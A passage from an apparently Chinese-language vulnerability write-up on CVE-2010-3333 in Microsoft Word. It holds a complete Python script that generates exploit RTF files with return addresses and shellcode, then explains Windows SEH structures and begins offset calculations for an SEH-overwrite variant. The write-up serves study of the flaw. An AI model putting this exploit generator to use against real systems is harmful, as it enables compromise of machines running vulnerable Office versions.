class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: Sp4n9x</span></span><br><span class="line"><span class="comment"># Name: MS10-087 Microsoft Word RTF pFragments Stack Buffer Overflow(CVE-2010-3333)</span></span><br><span class="line"><span class="comment"># Environment1: Windows XP SP3 &amp; Microsoft Office 2003 SP3(11.8169.8172)</span></span><br><span class="line"><span class="comment"># Environment2: Windows 7 x86 SP0 &amp; Microsoft Office 2007 SP0(12.0.4518.1014)</span></span><br><span class="line"><span class="comment"># Exploit Technology: ret2shellcode</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_array_paramter</span><span class="params">()</span>:</span></span><br><span class="line">    bad_sizes = (<span class="number">0</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">8</span>)</span><br><span class="line">    num = random.randint(<span class="number">0</span>,<span class="number">9</span>)</span><br><span class="line">    <span class="keyword">while</span> num <span class="keyword">in</span> bad_sizes:</span><br><span class="line">        num = random.randint(<span class="number">0</span>,<span class="number">9</span>)</span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(env)</span>:</span></span><br><span class="line">    el_size = generate_array_paramter() <span class="comment"># Array element size</span></span><br><span class="line">    el_count = generate_array_paramter() <span class="comment"># Array element count</span></span><br><span class="line"></span><br><span class="line">    str1 = struct.pack(<span class="string">'&lt;H'</span>,<span class="number">0x1111</span>)</span><br><span class="line">    str1 = binascii.b2a_hex(str1)</span><br><span class="line">    str2 = struct.pack(<span class="string">'&lt;H'</span>,<span class="number">0x2222</span>)</span><br><span class="line">    str2 = binascii.b2a_hex(str2)</span><br><span class="line">    data = str1 + str2</span><br><span class="line">    </span><br><span class="line">    length = struct.pack(<span class="string">'&lt;H'</span>,<span class="number">0x0130</span>) <span class="comment"># the data length after this</span></span><br><span class="line">    length =  binascii.b2a_hex(length) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> env == <span class="number">0</span>:</span><br><span class="line">        jmp_esp = struct.pack(<span class="string">'&lt;I'</span>,<span class="number">0x7dc54e64</span>) <span class="comment"># shell32.dll(version: 6.0.2900.6242),PAGE_READONLY(OllyFindAddr)</span></span><br><span class="line">        jmp_esp = binascii.b2a_hex(jmp_esp)</span><br><span class="line">    <span class="keyword">elif</span> env == <span class="number">1</span>:</span><br><span class="line">        jmp_esp = struct.pack(<span class="string">'&lt;I'</span>,<span class="number">0x788281cb</span>) <span class="comment"># msxml5.dll(version: 5.20.1072.0),ASLR Disable,PAGE_EXECUTE_READ(OllyFindAddr,mona)</span></span><br><span class="line">        jmp_esp = binascii.b2a_hex(jmp_esp)</span><br><span class="line">    <span class="keyword">elif</span> env == <span class="number">2</span>:</span><br><span class="line">        jmp_esp = struct.pack(<span class="string">'&lt;I'</span>,<span class="number">0x7ffa4512</span>) <span class="comment"># no module,universal,PAGE_READONLY(OllyFindAddr)</span></span><br><span class="line">        jmp_esp = binascii.b2a_hex(jmp_esp)</span><br><span class="line"></span><br><span class="line">    shellcode = (<span class="string">"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"</span></span><br><span class="line">                 <span class="string">"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"</span></span><br><span class="line">                 <span class="string">"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"</span></span><br><span class="line">                 <span class="string">"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"</span></span><br><span class="line">                 <span class="string">"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"</span></span><br><span class="line">                 <span class="string">"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x6e\x39"</span></span><br><span class="line">                 <span class="string">"\x78\x01\x68\x40\x53\x70\x34\x89\xe1\xfe\x49\x07\x31\xc0\x51"</span></span><br><span class="line">                 <span class="string">"\x50\xff\xd7"</span>) <span class="comment"># FatalAppExitA(uAction=0,lpMessageText="@Sp4n9x\x01")</span></span><br><span class="line">    shellcode = binascii.b2a_hex(shellcode)</span><br><span class="line"></span><br><span class="line">    pFragments_value = <span class="string">"%d;%d;"</span> % (el_size,el_count)</span><br><span class="line">    pFragments_value += data</span><br><span class="line">    pFragments_value += length</span><br><span class="line">    pFragments_value += <span class="string">'a'</span>*<span class="number">0x14</span>*<span class="number">2</span></span><br><span class="line">    pFragments_value += jmp_esp</span><br><span class="line">    pFragments_value += <span class="string">'a'</span>*<span class="number">0x10</span>*<span class="number">2</span></span><br><span class="line">    <span class="comment"># The fifth parameter of sub_30F0B5C2(Office2003)/sub_32E5955E(Office2007) on the stack</span></span><br><span class="line">    pFragments_value += <span class="string">'0'</span>*<span class="number">8</span> <span class="comment"># make "30F0B7B8 cmp [ebp+arg_8], ebx" equal(Office2003).</span></span><br><span class="line">    pFragments_value += shellcode</span><br><span class="line"></span><br><span class="line">    content = <span class="string">r"&#123;\rtf1"</span></span><br><span class="line">    content += <span class="string">r"&#123;\shp"</span></span><br><span class="line">    content += <span class="string">r"&#123;\sp"</span></span><br><span class="line">    content += <span class="string">r"&#123;\sn pfragments&#125;"</span></span><br><span class="line">    content += <span class="string">r"&#123;\sv %s"</span> % pFragments_value</span><br><span class="line">    content += <span class="string">r"&#125;&#125;&#125;&#125;"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> len(content)</span><br><span class="line">    <span class="keyword">if</span> env == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'CVE-2010-3333-ret2shellcode(XP_Office2003).rtf'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(content)</span><br><span class="line">    <span class="keyword">elif</span> env == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'CVE-2010-3333-ret2shellcode(Win7_Office2007).rtf'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(content)        </span><br><span class="line">    <span class="keyword">elif</span> env == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'CVE-2010-3333-ret2shellcode-universal.rtf'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(content) </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># 0:XP&amp;Office2003</span></span><br><span class="line">    <span class="comment"># 1:Win7&amp;Office2007</span></span><br><span class="line">    <span class="comment"># 2:universal</span></span><br><span class="line">    env = <span class="number">2</span></span><br><span class="line">    exploit(env)</span><br></pre></td></tr></table></figure></p><h3 id="0x42-方法二：覆盖SEH记录"><a href="#0x42-方法二：覆盖SEH记录" class="headerlink" title="0x42 方法二：覆盖SEH记录"></a>0x42 方法二：覆盖SEH记录</h3><h4 id="1、用户态的异常处理过程"><a href="#1、用户态的异常处理过程" class="headerlink" title="1、用户态的异常处理过程"></a>1、用户态的异常处理过程</h4><p>&emsp;&emsp;本程序产生的异常属于<code>用户态的异常</code>。</p><p><strong><code>用户态的异常处理过程:</code></strong></p><blockquote><ul><li>1、如果<code>发生异常</code>的程序正在<code>被调试</code>，那么将<code>异常信息</code>发送给正在调试它的<code>用户态调试器</code>，给调试器<code>第1次处理机会</code>；如果没有<code>被调试</code>，跳过本步。</li><li>2、如果<code>不存在</code>用户态调试器或调试器<code>未处理该异常</code>，那么在栈上放置<code>EXCEPTION_RECORD</code>和<code>CONTEXT</code>两个结构以及记录这两个结构位置的<code>EXCEPTION_POINTERS</code>结构，并将控制权返回给用户态<code>ntdll.dll</code>中的<code>KiUserExceptionDispatcher</code>函数，由它调用<code>ntdll!RtlDispatchException</code>函数进行<code>用户态的异常处理</code>。</li><li>3、如果<code>ntdll!RtlDispatchException</code>函数在调用用户态的异常处理过程中<code>未能处理该异常</code>，那么异常处理过程会再次返回<code>nt!KiDispatchException</code>，它将再次把<code>异常信息</code>发送给<code>用户态的调试器</code>，给调试器<code>第2次处理机会</code>。如果<code>没有</code>调试器存在，则<code>不会</code>进行第2次分发，而是直接<code>结束进程</code>。</li><li>4、如果第2次机会调试器<code>仍不处理</code>，<code>nt!KiDispatchException</code>会再次尝试把<code>异常</code>分发给<code>进程的异常端口</code>进行处理。该端口通常由<code>子系统进程csrss.exe</code>进行监听。子系统监听到该错误后，通常会显示一个<code>“应用程序错误”</code>对话框，用户可以单击<code>“确定”</code>按钮或者最后将其附加到调试器上的<code>“取消”</code>按钮。如果<code>没有调试器</code>能附加于其上，或者调试器还是<code>处理不了异常</code>，系统就调用<code>ExitProcess</code>函数来终结程序。</li><li>5、在<code>终结程序</code>之前，系统会再次调用<code>发生异常的线程</code>中的<code>所有异常处理过程</code>，这是线程异常处理过程所获得的<code>清理未释放资源</code>的最后机会，此后程序就终结了。</li></ul></blockquote><h4 id="2、SEH相关数据结构"><a href="#2、SEH相关数据结构" class="headerlink" title="2、SEH相关数据结构"></a>2、SEH相关数据结构</h4><h5 id="2-1、TIB结构"><a href="#2-1、TIB结构" class="headerlink" title="2.1、TIB结构"></a>2.1、TIB结构</h5><p>&emsp;&emsp;<code>TIB</code>(Thread Information Block,线程信息块)是保存<code>线程基本信息</code>的数据结构。在<code>用户模式</code>下，它位于<code>TEB</code>(Thread Environment Block,线程环境块)的<code>头部</code>，而<code>TEB</code>是操作系统为了保存<code>每个线程的私有数据</code>创建的，每个线程都有自己的TEB。在<code>Windows 2000 DDK</code>中(<code>winnt.h</code>)，TIB的定义如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">ExceptionList</span>;</span> <span class="comment">// 指向异常处理链表</span></span><br><span class="line">    PVOID StackBase;            <span class="comment">// 当前线程所使用的栈的栈底</span></span><br><span class="line">    PVOID StackLimit;           <span class="comment">// 当前线程所使用的栈的栈顶</span></span><br><span class="line">    PVOID SubSystemTib;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        PVOID FiberData;</span><br><span class="line">        DWORD Version;</span><br><span class="line">    &#125;;</span><br><span class="line">    PVOID ArbitraryUserPointer;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> *<span class="title">Self</span>;</span> <span class="comment">// 指向TIB结构自身</span></span><br><span class="line">&#125; NT_TIB;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;虽然<code>Windows</code>系统经历了多次<code>更新换代</code>，但是从<code>Windows 2000</code>到<code>Windows 10</code>，<code>TIB</code>的结构变化很小。其中，与异常处理相关的项是指向<code>EXCEPTION_REGISTRATION_RECORD</code>结构的<code>指针ExceptionList</code>，它位于<code>TIB</code>的<code>偏移0处</code>，同时在<code>TEB</code>的<code>偏移0处</code>。在<code>x86平台</code>的<code>用户模式</code>下，Windows将<code>FS段选择器</code>指向<code>当前线程的TEB数据</code>，即<code>TEB</code>总是由<code>fs:[0]</code>指向的(在<code>x64平台</code>上，这个关系变成了<code>gs:[0]</code>)。</p><h5 id="2-2、-EXCEPTION-REGISTRATION-RECORD结构"><a href="#2-2、-EXCEPTION-REGISTRATION-RECORD结构" class="headerlink" title="2.2、_EXCEPTION_REGISTRATION_RECORD结构"></a>2.2、_EXCEPTION_REGISTRATION_RECORD结构</h5><p>&emsp;&emsp;TEB(或TIB)偏移量为0的_EXCEPTION_REGISTRATION_RECORD主要是用于描述线程异常处理过程的地址，多个该结构的链表描述了多个线程异常处理过程的嵌套层次关系，其定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">Next</span>;</span>    <span class="comment">// 指向下一个_EXCEPTION_REGISTRATION_RECORD结构的指针</span></span><br><span class="line">    PEXCEPTION_ROUTINE Handler;                     <span class="comment">// 当前异常处理回调函数的地址</span></span><br><span class="line">&#125; EXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;其中，<code>“Next”</code>是指向下一个<code>_EXCEPTION_REGISTRATION_RECORD</code>结构(简称:<code>“ERR”</code>)的指针,形成一<code>链状结构</code>，而<code>链表头</code>就存放在<code>fs:[0]</code>指向的<code>TEB(或TIB)</code>中；<code>“Handler”</code>指向<code>异常处理回调函数</code>。当程序运行过程中产生异常时，系统的<code>异常分发器</code>就会从<code>fs:[0]</code>处取得<code>异常处理的链表头</code>，然后查找<code>异常处理链表</code>并依次调用<code>各个链表节点</code>中的<code>异常处理回调函数</code>。由于<code>TEB</code>是线程的<code>私有数据结构</code>，相应的，<code>每个线程</code>也都有自己的<code>异常处理链表</code>，即<code>SEH机制</code>的<code>作用范围</code>仅限于<code>当前线程</code>。从<code>数据结构</code>的角度来讲，<code>SEH链</code>就是一个只允许在<code>链表头部</code>进行<code>增加</code>和<code>删除</code>节点操作的<code>单向链表</code>，且<code>链表头部</code>永远保存在<code>fs:[0]</code>指向的<code>TEB(或TIB)</code>中。</p><p>&emsp;&emsp;下图就是<code>SEH异常处理链表</code>的示意图：<br><img src="/resources/2020/CVE-2010-3333/SEH异常处理链表示意图.png" alt="SEH异常处理链表示意图"></p><h5 id="2-3、-EXCEPTION-RECORD结构"><a href="#2-3、-EXCEPTION-RECORD结构" class="headerlink" title="2.3、_EXCEPTION_RECORD结构"></a>2.3、_EXCEPTION_RECORD结构</h5><p>&emsp;&emsp;各个<code>异常处理函数</code>除了针对<code>本异常的特定处理</code>之外，通常会将<code>异常信息</code>进行封装，以便进行后续处理。<code>封装异常信息</code>的结构就是<code>_EXCEPTION_RECORD</code>，该结构定义如下(<code>winnt.h</code>)：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> &#123;</span></span><br><span class="line">    DWORD    ExceptionCode;                         <span class="comment">// 异常代码</span></span><br><span class="line">    DWORD ExceptionFlags;                           <span class="comment">// 异常标志</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> *<span class="title">ExceptionRecord</span>;</span>      <span class="comment">// 指向另一个EXCEPTION_RECORD的指针</span></span><br><span class="line">    PVOID ExceptionAddress;                         <span class="comment">// 异常发生的地址</span></span><br><span class="line">    DWORD NumberParameters;                         <span class="comment">// 下面的ExceptionInformation含有的元素数目</span></span><br><span class="line">    ULONG_PTR ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];   <span class="comment">// 附加信息</span></span><br><span class="line">    &#125; EXCEPTION_RECORD;</span><br></pre></td></tr></table></figure><p><strong><code>常见的异常产生原因：</code></strong></p><table><thead><tr><th style="text-align:left">异常产生原因</th><th style="text-align:center">对应值</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">STATUS_GUARD_PAGE_VIOLATION</td><td style="text-align:center">080000001h</td><td style="text-align:left">读写属性为PAGE_GUARD的页面</td></tr><tr><td style="text-align:left">EXCEPTION_BREAKPOINT</td><td style="text-align:center">080000003h</td><td style="text-align:left">断点异常</td></tr><tr><td style="text-align:left">EXCEPTION_SINGLE_STEP</td><td style="text-align:center">080000004h</td><td style="text-align:left">单步中断</td></tr><tr><td style="text-align:left">EXCEPTION_INVALID_HANDLE</td><td style="text-align:center">0C0000008h</td><td style="text-align:left">向一个函数传递了一个无效句柄</td></tr><tr><td style="text-align:left">EXCEPTION_INVALID_VIOLATION</td><td style="text-align:center">0C0000005h</td><td style="text-align:left">读写内存违规</td></tr><tr><td style="text-align:left">EXCEPTION_ILLEGAL_INSTRUCTION</td><td style="text-align:center">0C000001Dh</td><td style="text-align:left">遇到无效指令</td></tr><tr><td style="text-align:left">EXCEPTION_IN_PAGE_ERROR</td><td style="text-align:center">0C0000006h</td><td style="text-align:left">存取不存在的页面</td></tr><tr><td style="text-align:left">EXCEPTION_INT_DIVIDE_BY_ZERO</td><td style="text-align:center">0C0000094h</td><td style="text-align:left">除0错误</td></tr><tr><td style="text-align:left">EXCEPTION_STACK_OVERFLOW</td><td style="text-align:center">0C00000FDh</td><td style="text-align:left">栈溢出</td></tr></tbody></table><h5 id="2-4、-CONTEXT结构"><a href="#2-4、-CONTEXT结构" class="headerlink" title="2.4、_CONTEXT结构"></a>2.4、_CONTEXT结构</h5><p>&emsp;&emsp;<code>异常处理函数</code>除了将一部分异常信息封装成<code>_EXCEPTION_RECORD</code>，还将另一部分异常信息封装成<code>陷阱帧</code>，它精确描述了发生异常时<code>线程的状态</code>(Windows的<code>任务调度</code>是基于<code>线程</code>的)。该结构与<code>处理器</code>高度相关，因此在不同的平台上(<code>Intel x86/x64</code>、<code>MIPS</code>、<code>Alpha</code>和<code>PowerPC</code>处理器等)有不同的定义。其结构中包含<code>每个寄存器的状态</code>，但该结构一般仅供<code>系统内核自身</code>或者<code>调试系统</code>使用。当需要把控制权交给<code>用户注册</code>的<code>异常处理程序</code>时，会将<code>上述结构</code>转换成一个名为<code>CONTEXT的结构</code>，它包含线程运行时处理器<code>各主要寄存器的完整镜像</code>，用于保存<code>线程运行环境</code>。</p><p>&emsp;&emsp;<code>x86平台</code>上的<code>CONTEXT结构</code>如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DECLSPEC_NOINITALL</span> _<span class="title">CONTEXT</span> &#123;</span></span><br><span class="line">    <span class="comment">// 标志位，表示整个结构中哪些部分是有效的</span></span><br><span class="line">    DWORD ContextFlags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当ContextFlags包含CONTEXT_DEBUG_REGISTERS时，以下部分有效</span></span><br><span class="line">    DWORD   Dr0;</span><br><span class="line">    DWORD   Dr1;</span><br><span class="line">    DWORD   Dr2;</span><br><span class="line">    DWORD   Dr3;</span><br><span class="line">    DWORD   Dr6;</span><br><span class="line">    DWORD   Dr7;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当ContextFlags包含CONTEXT_FLOATING_POINT时，以下部分有效</span></span><br><span class="line">    FLOATING_SAVE_AREA FloatSave;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当ContextFlags包含CONTEXT_SEGMENTS时，以下部分有效</span></span><br><span class="line">    DWORD   SegGs;</span><br><span class="line">    DWORD   SegFs;</span><br><span class="line">    DWORD   SegEs;</span><br><span class="line">    DWORD   SegDs;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当ContextFlags包含CONTEXT_INTEGER时，以下部分有效</span></span><br><span class="line">    DWORD   Edi;</span><br><span class="line">    DWORD   Esi;</span><br><span class="line">    DWORD   Ebx;</span><br><span class="line">    DWORD   Edx;</span><br><span class="line">    DWORD   Ecx;</span><br><span class="line">    DWORD   Eax;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当ContextFlags包含CONTEXT_CONTROL时，以下部分有效</span></span><br><span class="line">    DWORD   Ebp;</span><br><span class="line">    DWORD   Eip;</span><br><span class="line">    DWORD   SegCs;              <span class="comment">// MUST BE SANITIZED</span></span><br><span class="line">    DWORD   EFlags;             <span class="comment">// MUST BE SANITIZED</span></span><br><span class="line">    DWORD   Esp;</span><br><span class="line">    DWORD   SegSs;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当ContextFlags包含CONTEXT_EXTENDED_REGISTERS时，以下部分有效</span></span><br><span class="line">    BYTE    ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];</span><br><span class="line">&#125; CONTEXT;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;该结构的大部分是<code>不言自明</code>的。需要解释的是，其第一个域<code>ContextFlags</code>表示该结构中<code>哪些域有效</code>，当需要<code>CONTEXT结构</code>保存的信息<code>恢复执行</code>时可对应更新，这为<code>有选择的更新部分域</code>而非全部域提供了有效的手段。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONTEXT_i386    0x00010000L    <span class="comment">// 这假设i386和i486具有相同的上下文记录</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONTEXT_i486    0x00010000L    </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONTEXT_CONTROL             (CONTEXT_i386 | 0x00000001L) <span class="comment">// 控制寄存器</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONTEXT_INTEGER             (CONTEXT_i386 | 0x00000002L) <span class="comment">// (整数)通用寄存器</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONTEXT_SEGMENTS            (CONTEXT_i386 | 0x00000004L) <span class="comment">// 段寄存器</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONTEXT_FLOATING_POINT      (CONTEXT_i386 | 0x00000008L) <span class="comment">// 浮点寄存器</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONTEXT_DEBUG_REGISTERS     (CONTEXT_i386 | 0x00000010L) <span class="comment">// 调试寄存器</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONTEXT_EXTENDED_REGISTERS  (CONTEXT_i386 | 0x00000020L) <span class="comment">// 扩展寄存器</span></span></span><br></pre></td></tr></table></figure><h5 id="2-5、-EXCEPTION-POINTERS结构"><a href="#2-5、-EXCEPTION-POINTERS结构" class="headerlink" title="2.5、_EXCEPTION_POINTERS结构"></a>2.5、_EXCEPTION_POINTERS结构</h5><p>&emsp;&emsp;当一个<code>异常</code>发生时，在没有<code>调试器</code>干预的情况下，操作系统会将<code>异常信息</code>转交给<code>用户态的异常处理过程</code>。实际上，由于<code>同一个线程</code>在<code>用户态</code>和<code>内核态</code>使用的是<code>两个不同的栈</code>，为了让<code>用户态的异常处理程序</code>能够访问<code>与异常相关的数据</code>，操作系统必须把与<code>本次异常</code>相关联的<code>_EXCEPTION_RECORD结构</code>和<code>_CONTEXT结构</code>放到<code>用户栈</code>中，同时在栈上放置一个<code>_EXCEPTION_POINTERS结构</code>，它包含<code>两个指针</code>，一个指向<code>_EXCEPTION_RECORD结构</code>，另一个指向<code>_CONTEXT结构</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_POINTERS</span> &#123;</span></span><br><span class="line">  PEXCEPTION_RECORD ExceptionRecord;            <span class="comment">// _EXCEPTION_RECORD结构指针</span></span><br><span class="line">  PCONTEXT          ContextRecord;              <span class="comment">// _CONTEXT结构指针</span></span><br><span class="line">&#125; EXCEPTION_POINTERS, *PEXCEPTION_POINTERS;</span><br></pre></td></tr></table></figure><h4 id="3、计算偏移量"><a href="#3、计算偏移量" class="headerlink" title="3、计算偏移量"></a>3、计算偏移量</h4><p><strong><code>环境：</code></strong>XP &amp; Office2003</p><p>&emsp;&emsp;既然我们要覆盖<code>SEH记录</code>，就要搞清楚，<code>覆盖</code>栈数据之前，栈上有<code>哪些SEH记录</code>，以及<code>它们的位置</code>。在复制<code>pFragments属性数据</code>到栈上之前，栈上的<code>SEH记录</code>如下(CVE-2010-3333(target6,Crash).rtf)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">                       +----------+</span><br><span class="line">fs:[0] ---&gt; 0x0012FFB0 | 0012FFE0 |--+ 指向下一个SEH记录的指针</span><br><span class="line">                       +----------+  | </span><br><span class="line">            0x0012FFB4 | 30AA1ABC |  | SE处理程序</span><br><span class="line">                       +----------+  |</span><br><span class="line">                       |          |  |</span><br><span class="line">               ......  |  ......  |  |</span><br><span class="line">                       |          |  |</span><br><span class="line">                       +----------+  |</span><br><span class="line">            0x0012FFE0 | FFFFFFFF |&lt;-+ SEH链尾部</span><br><span class="line">                       +----------+</span><br><span class="line">            0x0012FFE4 | 7C839AB0 |    SE处理程序</span><br><span class="line">                       +----------+</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># Office v11.8307.8324, winword.exe v11.0.8307.0</span><br><span class="line"># Office v11.8328.8221, winword.exe v11.0.8328.0</span><br><span class="line">[ &apos;Microsoft Office 2003 SP3 English on Windows XP SP3 English&apos;,</span><br><span class="line">    &#123;</span><br><span class="line">        &apos;Offsets&apos; =&gt; [ 24580, 51156 ],</span><br><span class="line">        &apos;Ret&apos; =&gt; 0x30001bdd # p/p/r in winword.exe</span><br><span class="line">    &#125;</span><br><span class="line">],</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">0x001237DC pFragments缓冲区起始地址</span><br><span class="line">......</span><br><span class="line">0x001297E0 0x6E46336E 并不是SEH记录(0x001297E0-0x001237DC=24580)</span><br><span class="line">......</span><br><span class="line">0x0012FFB0 0x4E32704E SEH记录(0x0012FFB0-0x001237DC=51156)</span><br><span class="line">......</span><br><span class="line">0x0012FFE0 0x4E38714E 